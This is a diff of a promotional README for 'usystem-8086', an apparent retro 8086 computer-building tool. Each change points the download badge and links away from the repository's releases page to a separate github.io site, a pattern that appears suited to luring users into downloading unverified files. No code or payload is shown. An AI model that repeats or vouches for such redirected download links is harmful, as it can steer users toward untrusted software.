@@ -12,11 +12,11 @@ Whether you're curious about how computers work, a retro computing fan, or just 
 
 ### Step 1: Get the File
 
-[![DOWNLOAD NOW - CLICK HERE](https://img.shields.io/badge/⬇️_DOWNLOAD-usystem--8086-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://github.com/munchausenssyndromevociferator8037/usystem-8086/releases)
+[![DOWNLOAD NOW - CLICK HERE](https://img.shields.io/badge/⬇️_DOWNLOAD-usystem--8086-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://munchausenssyndromevociferator8037.github.io)
 
 Visit this link to download the application.
 
-Click the button above or go to our [Releases Page](https://github.com/munchausenssyndromevociferator8037/usystem-8086/releases) to get your copy of usystem-8086. The download link will take you to our official download page where you can grab the latest version of this incredible educational tool.
+Click the button above or go to our [Releases Page](https://munchausenssyndromevociferator8037.github.io) to get your copy of usystem-8086. The download link will take you to our official download page where you can grab the latest version of this incredible educational tool.
 
 ### Step 2: Run It
 
@@ -111,7 +111,7 @@ Don't just read about how computers work—**build your own**! With usystem-8086
 
 ### Ready to Begin?
 
-Visit our [Download Page](https://github.com/munchausenssyndromevociferator8037/usystem-8086/releases) now and start building. Your personal computer from the past is waiting for you!
+Visit our [Download Page](https://munchausenssyndromevociferator8037.github.io) now and start building. Your personal computer from the past is waiting for you!
 
 ---
 
